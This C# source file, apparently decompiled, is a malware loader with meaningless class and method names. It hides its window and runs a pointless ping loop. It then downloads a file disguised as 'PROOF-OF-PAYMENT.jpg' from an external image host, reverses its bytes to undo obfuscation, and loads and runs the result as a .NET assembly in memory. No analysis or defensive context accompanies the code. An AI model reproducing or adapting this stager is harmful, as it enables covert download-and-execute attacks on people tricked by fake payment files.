using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;

namespace Telsf;

internal class Boss : Baser
{
	private static List<byte> _buffers;

	internal static void Mouse()
	{
		IntPtr mainWindowHandle = Process.GetCurrentProcess().MainWindowHandle;
		Native.ShowWindow(mainWindowHandle, 0);
		_buffers = new List<byte>();
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		for (int i = 0; i < 100; i++)
		{
			try
			{
				Ping ping = new Ping();
				string hostNameOrAddress = "google.com";
				PingReply pingReply = ping.Send(hostNameOrAddress, 2000);
				if (pingReply.Status == IPStatus.Success)
				{
					Console.WriteLine("Address: {0}", pingReply.Address.ToString());
					Console.WriteLine("RoundTrip time: {0}", pingReply.RoundtripTime);
					Console.WriteLine("Time to live: {0}", pingReply.Options!.Ttl);
					Console.WriteLine("Don't fragment: {0}", pingReply.Options!.DontFragment);
					Console.WriteLine("Buffer size: {0}", pingReply.Buffer.Length);
				}
				else
				{
					Console.WriteLine("Address: {0}", pingReply.Status);
				}
			}
			catch
			{
			}
		}
	}

	internal static void Cow()
	{
		byte[] array = new BinaryReader(WebRequest.Create("https://www.uplooder.net/img/image/98/612637f3384886687cadffcf93e3545a/PROOF-OF-PAYMENT.jpg").GetResponse().GetResponseStream()).ReadBytes(85692028);
		byte[] array2 = array;
		foreach (byte item in array2)
		{
			_buffers.Add(item);
		}
		_buffers.Reverse();
	}

	internal static void Rabbit()
	{
		Lion(Assembly.Load(_buffers.ToArray()));
	}

	internal static void Lion(Assembly a)
	{
		Type type = a.GetType("Ppjakqmfmjxm.Yipykns");
		MethodInfo method = type.GetMethod("Rkrrxlymnvjdcut");
		string value = (string)method.Invoke(null, null);
		if (!string.IsNullOrEmpty(value))
		{
			Console.WriteLine(value);
		}
	}
}
